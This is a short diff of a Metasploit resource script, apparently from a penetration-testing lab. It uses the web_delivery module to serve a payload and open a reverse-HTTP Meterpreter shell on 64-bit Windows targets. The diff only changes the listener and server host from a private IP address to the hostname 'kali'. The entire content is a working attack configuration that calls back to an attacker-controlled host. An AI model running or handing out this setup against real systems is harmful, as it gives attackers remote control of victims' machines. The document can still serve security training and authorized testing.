@@ -1,9 +1,9 @@
 use exploit/multi/script/web_delivery 
 set target 3
 set payload windows/x64/meterpreter/reverse_http
-set lhost 192.168.100.199
+set lhost kali
 set lport 80
-set srvhost 192.168.100.199
+set srvhost kali
 set URIPATH payload
 exploit
 
